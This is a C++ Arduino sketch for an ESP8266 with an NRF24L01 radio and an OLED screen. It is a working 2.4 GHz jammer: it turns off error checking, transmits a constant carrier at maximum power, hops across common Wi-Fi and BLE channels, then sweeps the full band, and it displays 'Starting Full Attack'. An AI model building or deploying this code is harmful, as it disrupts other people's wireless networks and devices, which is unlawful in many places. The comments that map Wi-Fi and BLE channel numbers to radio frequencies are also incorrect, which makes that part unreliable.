#include <SPI.h>
#include "RF24.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <string>

// Using NodeMCU ESP8266
RF24 radio(2, 4); // CE = D4 (GPIO2), CSN = D2 (GPIO4)
byte i = 45; // Arbitrary channel used for carrier during display setup
Adafruit_SSD1306 display = Adafruit_SSD1306(128, 64, &Wire);

// Wi-Fi high-traffic channels: 1 (2.412GHz), 6 (2.437GHz), 11 (2.462GHz)
// BLE advertising/control channels: 37 (2.402GHz), 38 (2.426GHz), 39 (2.480GHz)
const uint8_t priorityChannels[] = {6, 1, 11, 37, 38, 39};

// Function to display a message on the OLED screen
void displayMessage(const char* line, uint8_t x = 55, uint8_t y = 22) {
  radio.powerDown();    // Temporarily turn off RF24 to avoid interference with display
  SPI.end();            // Disable SPI so OLED can use it
  delay(10);

  display.clearDisplay(); // Clear the screen
  display.setTextSize(1); // Set small text size
  String text = String(line);
  int16_t cursor_y = y;
  int16_t maxWidth = 128 - x; // Limit line length

  // Print wrapped text line-by-line
  while (text.length() > 0) {
    int16_t charCount = 0, lineWidth = 0;
    while (charCount < text.length() && lineWidth < maxWidth) {
      charCount++;
      lineWidth = 6 * charCount;
    }
    if (charCount < text.length()) {
      int16_t lastSpace = text.substring(0, charCount).lastIndexOf(' ');
      if (lastSpace > 0) charCount = lastSpace + 1;
    }
    display.setCursor(x, cursor_y);
    display.println(text.substring(0, charCount));
    text = text.substring(charCount);
    cursor_y += 10;
    if (cursor_y > 64) break;
  }
  display.display(); // Push to screen

  // Re-enable RF24 radio after OLED display
  SPI.begin();
  radio.powerUp();
  delay(5);
  radio.startConstCarrier(RF24_PA_MAX, i); // Resume constant carrier
}

void setup() {
  Serial.begin(9600);
  Wire.begin(14, 12); // Set SDA (D5) and SCL (D6) for OLED I2C communication

  // Initialize the OLED screen
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("OLED screen not found!"));
    exit(0); // Stop execution if display fails
  }

  // Show a quick disclaimer
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0, 0);
  display.print(F("Disclaimer: Use responsibly"));
  display.display();
  delay(900);

  // Initialize and configure the NRF24 radio
  if (radio.begin()) {
    delay(200);
    radio.setAutoAck(false);                 // Disable auto-acknowledge for faster transmission
    radio.setRetries(0, 0);                  // No retries
    radio.setPayloadSize(32);                // Maximum payload for stronger interference
    radio.setAddressWidth(3);                // Use 3-byte address
    radio.setPALevel(RF24_PA_MAX);           // Maximum transmission power
    radio.setDataRate(RF24_2MBPS);           // Fastest data rate
    radio.setCRCLength(RF24_CRC_DISABLED);   // Disable error checking
    radio.stopListening();                   // Set as transmitter
    radio.printPrettyDetails();              // Output current radio settings
    radio.startConstCarrier(RF24_PA_MAX, i); // Begin constant carrier wave on channel i
    displayMessage("Starting Full Attack", 0, 0); // Show startup message
  } else {
    Serial.println("BLE Jammer couldn't be started!");
    displayMessage("Jammer Error!");
  }
}

void loop() {
  // Step 1: Target high-traffic Wi-Fi & BLE channels first
  for (size_t j = 0; j < sizeof(priorityChannels); j++) {
    radio.setChannel(priorityChannels[j]); // Rapidly jump to each critical channel
  }

  // Step 2: Sweep through entire 2.4GHz spectrum (0–79)
  for (size_t i = 0; i < 80; i++) {
    radio.setChannel(i); // Cycle through all available channels
  }
}
